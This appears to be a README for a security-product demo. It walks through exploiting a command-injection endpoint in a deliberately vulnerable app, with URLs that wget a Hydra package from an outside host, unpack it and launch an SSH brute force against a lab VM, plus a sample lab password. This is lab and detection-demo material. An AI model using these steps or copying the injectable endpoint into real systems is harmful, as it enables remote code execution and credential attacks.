# Hydra scenario

This application lets you write messages, whatever they are (it is certainly possible to hack the message form by itself).
This is entirely managed in-memory, so dev team decided to add endpoints where you can check your log file and decide to load messages directly from the log in case of a restart.

Hitting the http://{yourhost}:{port}/ will let you add messages. 

Hitting http://{yourhost}:{port}/admin lets you start the actual hack by passing command

# Prerequisites
Prepare a VM with ssh enabled and get its ip to launch hydra against this specific machine.

Also you can add a user molly with this password 04Darter_Dew to ensure Hydra will be able to connect on the VM you hosted.
You can change the username and adapt the 7th command.

The sapp.tar.gz file is containing hydra pre-compiled for Ubuntu (only tested on Ubuntu), the rockyou.txt password file, and the launch script to be set in the url to avoid PATH issues.
The file is available directly from here and also from the link in the steps below.

# Steps

1. Start browsing the app at http://{yourhost}:{port}/, explaining this is the same scenario as having [EVAL command available in Redis](https://redis.io/commands/eval).
2. Then move to the admin page and show the tail or cat command. 
3. Explain you have those links to decide if you'll hydrate messages from the log file or not. But there is an issue as the cat/tail link let you run arbitrary command on the host.
4. Type in the url bar http://{yourhost}:{port}/admin/ops?cmd=wget&args=https://storage.googleapis.com/nwlw-raw-data/sapp.tar.gz . This will download a Hydra pre-packed zip file. (should triggered the 1st alert in LW)
5. Go to http://{yourhost}:{port}/admin/ops?cmd=tar&args=-xzf,sapp.tar.gz Uncompress the file
5. Go to http://{yourhost}:{port}/admin/ops?cmd=./launch.sh&args={target machine ip}